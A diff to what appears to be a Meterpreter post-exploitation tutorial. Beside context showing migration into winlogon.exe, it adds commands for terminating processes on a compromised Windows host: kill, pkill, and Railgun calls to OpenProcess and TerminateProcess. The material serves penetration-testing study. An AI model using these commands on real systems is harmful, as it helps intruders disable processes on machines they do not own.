@@ -51,3 +51,31 @@ meterpreter > migrate -N winlogon.exe
 meterpreter > getpid
 Current pid: 1280
 ```
+
+## 4.3 - Terminate Process
+
+### 4.3.1 - Process ID
+
+Terminate process ID.
+
+```
+meterpreter > kill <pid>
+```
+
+We'll create a new handle by retrieving the process ID. Then define a process handle `_['return']` after the conditions has been met. Terminate by calling the railgun function with zero exit code as an indication the process has been killed.
+
+```
+meterpreter > irb
+
+>> client.railgun.kernel32.OpenProcess("PROCESS_TERMINATE", false, <pid>)
+
+>> process_handle = _['return'] -> define a process handle
+
+>> client.railgun.kernel32.TerminateProcess(process_handle, 0)
+```
+
+### 4.3.1 - Process Name
+
+```
+meterpreter > pkill <process_name>
+```
